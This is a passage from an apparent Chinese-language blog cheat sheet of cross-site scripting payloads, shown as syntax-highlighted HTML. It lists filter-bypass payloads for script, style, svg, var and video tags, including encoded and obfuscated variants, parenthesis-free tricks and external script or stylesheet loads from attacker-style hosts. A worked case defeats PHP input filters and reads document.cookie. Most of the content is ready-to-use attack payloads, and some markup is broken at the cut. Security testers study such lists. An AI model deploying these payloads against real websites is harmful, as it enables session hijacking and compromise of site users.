class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://马赛克/payload.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">window</span>[<span class="string">'alert'</span>](<span class="built_in">document</span>[<span class="string">'domain'</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 绕过点（.）的限制</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">data:text/javascript,alert(/xss/)</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 脚本src中的数据协议</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">data:text/javascript;base64,YWxlcnQoMSk</span>=&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 带有base64的脚本src中的数据协议</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">href</span>=<span class="string">"data:text/javascript,alert(1)"</span> /&gt;</span><span class="actionscript"> <span class="comment">// SVG脚本href属性，（IE、Firefox）无需关闭脚本标签,（Google）需要关闭</span></span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&amp;#100&amp;#97&amp;#116&amp;#97:text/javascript,alert(/xss/)</span>&gt;</span><span class="undefined"></span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">import</span>(<span class="string">'data:text/javascript,alert(1)'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 带有数据URL的导入语句</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">String</span>.fromCharCode(<span class="number">49</span>,<span class="number">49</span>))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006C\u0065\u0072\u0074(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061lert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // Unicode转义</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u&#123;61&#125;lert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // Unicode转义ES6样式</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u&#123;0000000061&#125;lert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // Unicode转义ES6样式零填充</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="string">'\x61lert(1)'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 十六进制编码JavaScript转义</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="string">'\141lert(1)'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 八进制编码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="string">'alert(\061)'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 八进制编码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>(<span class="string">'alert(\61)'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 八进制编码</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  // 使用反引号绕过</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$=~[];$=&#123;<span class="attr">___</span>:++$,<span class="attr">$$$$</span>:(![]+<span class="string">""</span>)[$],<span class="attr">__$</span>:++$,<span class="attr">$_$_</span>:(![]+<span class="string">""</span>)[$],<span class="attr">_$_</span>:++$,<span class="attr">$_$$</span>:(&#123;&#125;+<span class="string">""</span>)[$],<span class="attr">$$_$</span>:($[$]+<span class="string">""</span>)[$],<span class="attr">_$$</span>:++$,<span class="attr">$$$_</span>:(!<span class="string">""</span>+<span class="string">""</span>)[$],<span class="attr">$__</span>:++$,<span class="attr">$_$</span>:++$,<span class="attr">$$__</span>:(&#123;&#125;+<span class="string">""</span>)[$],<span class="attr">$$_</span>:++$,<span class="attr">$$$</span>:++$,<span class="attr">$___</span>:++$,<span class="attr">$__$</span>:++$&#125;;$.$_=($.$_=$+<span class="string">""</span>)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+<span class="string">""</span>)[$.__$])+((!$)+<span class="string">""</span>)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!<span class="string">""</span>+<span class="string">""</span>)[$.__$])+($._=(!<span class="string">""</span>+<span class="string">""</span>)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!<span class="string">""</span>+<span class="string">""</span>)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+<span class="string">"\""</span>+$.$_$_+(![]+<span class="string">""</span>)[$._$_]+$.$$$_+<span class="string">"\\"</span>+$.__$+$.$$_+$._$_+$.__+<span class="string">"("</span>+$.___+<span class="string">")"</span>+<span class="string">"\""</span>)())();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefinedspan><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">===============================限制字符====================================</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">onerror=alert;<span class="keyword">throw</span> <span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无括号，使用异常处理</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">&#123;onerror=alert&#125;<span class="keyword">throw</span> <span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无括号，无分号，使用异常处理</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"><span class="keyword">throw</span> onerror=alert,<span class="number">1</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无括号的异常处理，没有使用表达式的半冒号</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">throw</span> onerror=<span class="built_in">eval</span>,<span class="string">'=alert\x281\x29'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无括号异常处理和evil</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">&#123;onerror=<span class="built_in">eval</span>&#125;<span class="keyword">throw</span>&#123;<span class="attr">lineNumber</span>:<span class="number">1</span>,<span class="attr">columnNumber</span>:<span class="number">1</span>,<span class="attr">fileName</span>:<span class="number">1</span>,<span class="attr">message</span>:<span class="string">'alert\x281\x29'</span>&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无括号，在Firefox上使用异常处理和evil</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="string">'alert\x281\x29'</span><span class="keyword">instanceof</span>&#123;[<span class="built_in">Symbol</span>.hasInstance]:<span class="built_in">eval</span>&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无括号，使用ES6 hasInstance和instanceof与eval</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="string">'alert\x281\x29'</span><span class="keyword">instanceof</span>&#123;[<span class="built_in">Symbol</span>[<span class="string">'hasInstance'</span>]]:<span class="built_in">eval</span>&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无括号，使用ES6的hasInstance和instanceof以及eval</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">location=<span class="string">'javascript:alert\x281\x29'</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无括号，使用位置重定向</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">location=name</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无字符串，使用位置没有括号重定向</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert<span class="string">`1`</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> // 无括号，使用模板字符串</span><br></pre></td></tr></table></figure><h4 id="style-标签需要加强"><a class="markdownIt-Anchor" href="#style-标签需要加强"></a> ◈ <code>&lt;style&gt;</code> 标签(需要加强)</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="undefined">@import'http://xss.rocks/xss.css';</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="css"><span class="selector-tag">BODY</span>&#123;<span class="attribute">-moz-binding</span>:<span class="built_in">url</span>(<span class="string">"http://xss.rocks/xssmoz.xml#xss"</span>)&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span><span class="undefined">@im\port'\ja\vasc\ript:alert("XSS")';</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">TYPE</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined">alert('XSS');</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="css"><span class="selector-tag">BODY</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">"javascript:alert('XSS')"</span>)&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css">@<span class="keyword">keyframes</span> x&#123;<span class="selector-tag">from</span> &#123;<span class="attribute">left</span>:<span class="number">0</span>;&#125;<span class="selector-tag">to</span> &#123;<span class="attribute">left</span>: <span class="number">1000px</span>;&#125;&#125;<span class="selector-pseudo">:target</span> &#123;<span class="attribute">animation</span>:<span class="number">10s</span> ease-in-out <span class="number">0s</span> <span class="number">1</span> x;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">style</span>=<span class="string">"position:absolute;"</span> <span class="attr">onanimationcancel</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> //CSS动画取消时触发(Firefox)</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css">@<span class="keyword">keyframes</span> x&#123;<span class="selector-tag">from</span> &#123;<span class="attribute">left</span>:<span class="number">0</span>;&#125;<span class="selector-tag">to</span> &#123;<span class="attribute">left</span>: <span class="number">1000px</span>;&#125;&#125;<span class="selector-pseudo">:target</span> &#123;<span class="attribute">animation</span>:<span class="number">10s</span> ease-in-out <span class="number">0s</span> <span class="number">1</span> x;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">style</span>=<span class="string">"position:absolute;"</span> <span class="attr">onanimationcancel</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // CSS动画结束时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-pseudo">:target</span> &#123;<span class="attribute">color</span>: red;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">style</span>=<span class="string">"transition:color 10s"</span> <span class="attr">ontransitioncancel</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // CSS过渡取消时触发（Firefox)</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-pseudo">:target</span> &#123;<span class="attribute">color</span>:red;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">style</span>=<span class="string">"transition:color 1s"</span> <span class="attr">ontransitionend</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // CSS过渡结束时触发（Chrome)</span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-pseudo">:target</span> &#123;<span class="attribute">transform</span>: <span class="built_in">rotate</span>(180deg);&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">style</span>=<span class="string">"transition:transform 2s"</span> <span class="attr">ontransitionrun</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // CSS过渡开始时触发（Firefox)</span><br></pre></td></tr></table></figure><h4 id="svg-标签"><a class="markdownIt-Anchor" href="#svg-标签"></a> ◈ <code>&lt;svg&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>/<span class="attr">onload</span>=<span class="string">prompt(1);</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onclick</span>/<span class="attr">onmouseover</span>/<span class="attr">onmouseup</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;#40/1/&amp;#41</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="tag">&lt;/<span class="name">svg</span>&gt;</span>// Works With All Browsers</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">onbegin</span>=<span class="string">alert(1)</span> <span class="attr">attributeName</span>=<span class="string">x</span> <span class="attr">dur</span>=<span class="string">1s</span>&gt;</span> // 网址更改后触发（Chrome）</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">onbegin</span>=<span class="string">alert(1)</span> <span class="attr">attributeName</span>=<span class="string">x</span> <span class="attr">dur</span>=<span class="string">1s</span>&gt;</span> // svg动画开始时触发（Chrome、Firefox、Safari）</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">onload</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 加载元素时触发（Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">onrepeat</span>=<span class="string">alert(1)</span> <span class="attr">attributeName</span>=<span class="string">x</span> <span class="attr">dur</span>=<span class="string">1s</span> <span class="attr">repeatCount</span>=<span class="string">2</span> /&gt;</span> // svg动画重复时触发（Chrome、Firefox、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">xlink:href</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">"20"</span> <span class="attr">y</span>=<span class="string">"20"</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 带有JavaScript协议的SVG中的Xlink命名空间</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">xlink:href</span>=<span class="string">#xss</span> <span class="attr">attributeName</span>=<span class="string">href</span> <span class="attr">values</span>=<span class="string">javascript:alert(1)</span> /&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">xss</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">20</span> <span class="attr">y</span>=<span class="string">20</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // 使用值的SVG动画标签</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">animate</span> <span class="attr">xlink:href</span>=<span class="string">#xss</span> <span class="attr">attributeName</span>=<span class="string">href</span> <span class="attr">from</span>=<span class="string">javascript:alert(1)</span> <span class="attr">to</span>=<span class="string">1</span> /&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">xss</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">20</span> <span class="attr">y</span>=<span class="string">20</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> // SVG动画标签用于</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">set</span> <span class="attr">xlink:href</span>=<span class="string">#xss</span> <span class="attr">attributeName</span>=<span class="string">href</span> <span class="attr">from</span>=<span class="string">?</span> <span class="attr">to</span>=<span class="string">javascript:alert(1)</span> /&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">xss</span>&gt;</span><span class="tag">&lt;<span class="name">text</span> <span class="attr">x</span>=<span class="string">20</span> <span class="attr">y</span>=<span class="string">20</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span>  // SVG设置标签</span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span> <span class="attr">href</span>=<span class="string">"data:text/javascript,alert(1)"</span> /&gt;</span><span class="actionscript"> <span class="comment">// SVG脚本href属性，（IE、Firefox）无需关闭脚本标签,（Google）需要关闭</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">+++++++++++++++++带有HTML编码的SVG脚本+++++++++++++++++</span></span><br><span class="line"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#97;lert(1)</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#x61;lert(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert&amp;NewLine;(1)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">x=<span class="string">"&amp;quot;,alert(1)//"</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="var-标签"><a class="markdownIt-Anchor" href="#var-标签"></a> ◈ <code>&lt;var&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">var</span> <span class="attr">onmouseover</span>=<span class="string">"prompt(1)"</span>&gt;</span>M<span class="tag">&lt;/<span class="name">var</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="video-标签"><a class="markdownIt-Anchor" href="#video-标签"></a> ◈ <code>&lt;video&gt;</code> 标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">prompt(1);</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">oncanplaythrough</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"validvideo.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span> // 加载足够的数据以完全播放资源时触发（Chrome、Firefox、IE、Safari)</span><br><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">controls</span> <span class="attr">onended</span>=<span class="string">alert(1)</span>&gt;</span><span class="tag">&lt;<span class="name">source</span> <span class="attr">src</span>=<span class="string">"mov_bbb.mp4"</span> <span class="attr">type</span>=<span class="string">"video/mp4"</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span> // 视频播放完后触发</span><br></pre></td></tr></table></figure><h3 id="三-xss-案例"><a class="markdownIt-Anchor" href="#三-xss-案例"></a> 三、xss 案例</h3><h4 id="案例一用-location-变形-payload"><a class="markdownIt-Anchor" href="#案例一用-location-变形-payload"></a> <code>案例一</code>：用 location 变形 payload</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'X-XSS-Protection: 0'</span>);</span><br><span class="line">$xss = <span class="keyword">isset</span>($_GET[<span class="string">'xss'</span>])?$_GET[<span class="string">'xss'</span>]:<span class="string">''</span>;</span><br><span class="line">$xss = str_replace(<span class="keyword">array</span>(<span class="string">"("</span>,<span class="string">")"</span>,<span class="string">"&amp;"</span>,<span class="string">"\\"</span>,<span class="string">"&lt;"</span>,<span class="string">"&gt;"</span>,<span class="string">"'"</span>,<span class="string">"`"</span>,<span class="string">"&amp;"</span>), <span class="string">''</span>, $xss);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$xss&#125;\"&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>该案例的过滤器过滤了array(&quot;(&quot;,&quot;)&quot;,&quot;&amp;&quot;,&quot;&quot;,&quot;&lt;&quot;,&quot;&gt;&quot;,&quot;’&quot;,&quot;`&quot;,&quot;&amp;&quot;)，而没有过滤双引号，输出点在 <code>&lt;img src=&quot;xxxx&quot;&gt;</code>，xxxx这里，怎么构造一个可以利用的XSS Payload？</p></blockquote><p><code>涉及的知识点</code></p><blockquote><p>涉及到js中关键词(函数名、变量名、保留字等)、字符串、左值与右值的问题，也是所有语言中都有的问题。</p></blockquote><p><code>举例</code></p><blockquote><p>比如<code>test=&quot;phithon&quot;;</code>，这里test就是左值、变量名，&quot;phithon&quot;就是右值、字符串，<code>=</code>和<code>&quot;</code>是符号。字符串中可以用编码来替换原始字符，比如用<code>\u0028</code>代替左括号<code>(</code>，或用<code>\50</code>来代替左括号<code>(</code>。左值必须是可写的，比如一个变量，我们不能把字符串放在等号左边，因为字符串是一个只读的值。还有，有关于javascript的字符编码，都只能用在字符串中，不能用字符编码去代替符号或变量名、函数名。</p></blockquote><p><code>分析</code></p><blockquote><p>可以利用location加javascript伪协议，将“符号”、“变量名”、“函数名”统统变成“字符串”，在字符串中我们可以使用所有js里可以使用的编码，去构造payload。怎么变？比如我们可以构造如下payload：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">location</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这个时候，alert(1)被放进了字符串里，因为有javascript伪协议，所以也可以执行xss。在字符串中就能够用很多编码了，虽然我们这里过滤了<code>(</code>，但可以用url编码来替代括号，如下payload：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">location</span>=<span class="string">"javascript:alert%281%29"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>就能成功绕过上述filter。我们把难度提高一点。再拦截一些关键词，比如document，cookie，eval，setTimeout，alert等：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'X-XSS-Protection: 0'</span>);</span><br><span class="line">$xss = <span class="keyword">isset</span>($_GET[<span class="string">'xss'</span>])?$_GET[<span class="string">'xss'</span>]:<span class="string">''</span>;</span><br><span class="line">$xss = str_replace(<span class="keyword">array</span>(<span class="string">"("</span>,<span class="string">")"</span>,<span class="string">"&amp;"</span>,<span class="string">"\\"</span>,<span class="string">"&lt;"</span>,<span class="string">"&gt;"</span>,<span class="string">"'"</span>), <span class="string">''</span>, $xss);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/(script|document|cookie|eval|setTimeout|alert)/'</span>, $xss)) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">'bad'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;img src=\"&#123;$xss&#125;\"&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>这时我们怎么能弹出cookie？这个时候我们可以用字符串拼接的方式绕过，这也是得益于我们之前将要执行的“函数”变成了“字符串”才有的效果，我们不可能直接``，js中只有“字符串”才能拼接。payload例如：</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"1"</span> <span class="attr">onerror</span>=<span class="string">location</span>=<span class="string">"javascr"</span>+"<span class="attr">ipt:al</span>"+"<span class="attr">ert</span>%<span class="attr">28docu</span>"+"<span class="attr">ment.co</span>"+"<span class="attr">okie</span>%<span class="attr">29</span>"&gt;</span></span><br></pre></td></tr></table></figure><h3 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接：</h3><p>1.<a href="https://momomoxiaoxi.com/2017/10/10/XSS/" target="_blank" rel="noopener">XSS测试备忘录</a></p><h3 id="更新日志"><a class="markdownIt-Anchor" href="#更新日志"></a> <code>更新日志</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2020.3.9 原发</span><br><span class="line">2020.3.12增加一些各标签中的payload，来源：https://mp.weixin.qq.com/s/pewStdGNzvv5OTl8Vh7okQ</span><br><span class="line">2020.3.14增加&amp;NewLine;&amp;Tab;&amp;colon;增加一些标签的payload</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
